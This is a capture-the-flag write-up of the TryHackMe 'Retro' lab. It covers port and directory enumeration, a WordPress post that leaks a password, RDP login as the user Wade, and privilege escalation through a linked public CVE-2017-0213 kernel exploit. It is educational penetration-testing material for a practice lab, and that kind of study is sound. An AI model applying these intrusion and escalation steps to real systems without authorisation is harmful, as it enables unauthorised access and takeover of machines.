---
layout: post
title:  THM Retro Write-up
description: Part of the OSCP+ Preparation Series
date:   2024-11-19 05:00:00 +0300
image:  '/images/thm_retro.png'
tags:   [Write-ups, THM, OSCP+, Hard, WordPress, RDP, Windows-Kernel-Exploit, CVE]
---

# Table of Contents
- [Enumeration](#enumeration)
  - [Nmap](#nmap)
  - [Web Enumeration](#web-enumeration)
- [Foothold](#foothold)
  - [RDP Access with xFreeRDP](#rdp-access-with-xfreerdp)
- [Privilege Escalation](#privilege-escalation)
  - [CVE-2017-0213 Kernel Exploit](#cve-2017-0213-kernel-exploit)

# Enumeration
### Nmap 10.10.48.32
```shell
# Step 1 - Find active ports
nmap -p- --min-rate 10000 10.10.52.234

# Step 2 - Focus scan on the active ports found
nmap -A -T4 -Pn -p80,3389 10.10.52.234
```

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-18 11:31 EST
Nmap scan report for 10.10.52.234
Host is up (0.055s latency).

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-11-18T16:32:10+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=RetroWeb
| Not valid before: 2024-11-17T16:26:50
|_Not valid after:  2025-05-19T16:26:50
| rdp-ntlm-info: 
|   Target_Name: RETROWEB
|   NetBIOS_Domain_Name: RETROWEB
|   NetBIOS_Computer_Name: RETROWEB
|   DNS_Domain_Name: RetroWeb
|   DNS_Computer_Name: RetroWeb
|   Product_Version: 10.0.14393
|_  System_Time: 2024-11-18T16:32:05+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.49 seconds
```

Examining our nmap scan results, we can see port 80 HTTP and port 3389 RDP open.

### Web Enumeration
If we visit the website, we will see a Microsoft IIS page:

```shell
http://10.10.52.234/
```

Lets use feroxbuster to try finding something interesting:

```shell
feroxbuster -u http://10.10.52.234/
```

Examining the results, we will can easily notice that the target is running WordPress (WP).

Notice that all directories in the results starts with:

```shell
http://10.10.52.234/retro
```

If we visit the URL above, we will appear on a website which seems to be some kind of retro gaming website.

Lets take a look at the posts created by Wade. Click on Wade, it will take us to a list of Posts by Wade:

```shell
http://10.10.52.234/retro/index.php/author/wade/
```

Examining the posts on the blog, we will find a password:

```shell
http://10.10.52.234/retro/index.php/2019/12/09/ready-player-one/
```

```shell
Leaving myself a note here just in case I forget how to spell it: parzival
```

Maybe we can use parzival as password somewhere.

# Foothold
### RDP Access with xFreeRDP
We can suppose that prazival is the password for the user Wade. Lets try getting RDP access with these credentials:

```shell
Wade:parzival
```

```shell
nxc rdp 10.10.48.32 -u Wade -p 'parzival' --local-auth
```

```shell
sudo xfreerdp /u:Wade /p:parzival /v:10.10.58.188 /drive:share,/home/kali/share
```

Nice! The credentials were valid and we got access as the user Wade.

### User Flag
Now we can get the user.txt flag, we can click and open it on the desktop or use the command line:

```shell
type C:\Users\Wade\Desktop\user.txt
```

# Privilege Escalation
### CVE-2017-0213 Kernel Exploit
We can use ver or systeminfo to enumerate the kernel info:

```shell
ver

systeminfo | findstr /B /C:"OS Version"
```

This will give us the built 14393 as result:

```shell
OS Version:                10.0.14393 N/A Build 14393
```

We can find a exploit for the version 14393 here if we do some search and look throughly:

https://github.com/SecWiki/windows-kernel-exploits

Lets download the kernel exploit we need:

```shell
https://github.com/SecWiki/windows-kernel-exploits/blob/master/CVE-2017-0213/CVE-2017-0213_x64.zip
```

Note: Dont use wget to download it. Visit the page and click on download.

Now move and use the exploit:

```shell
# I will make use of my xfreerdp folder
sudo cp CVE-2017-0213_x64.exe /home/kali/share

# Now we can run the exploit
Shift + Right-click on Desktop -> Open command window here

# Enter the following to run the exploit
CVE-2017-0213_x64.exe
```

A new CLI window will pop up giving us a shell as system.

### Root Flag
Now we can get the root.txt flag:

```shell
type C:\Users\Administrator\Desktop\root.txt.txt
```

If we get any problem when trying to copy the flag content, just copy the root.txt.txt into the desktop of the user Wade and open the file there:

```shell
copy C:\Users\Administrator\Desktop\root.txt.txt C:\Users\Wade\Desktop\root.txt
```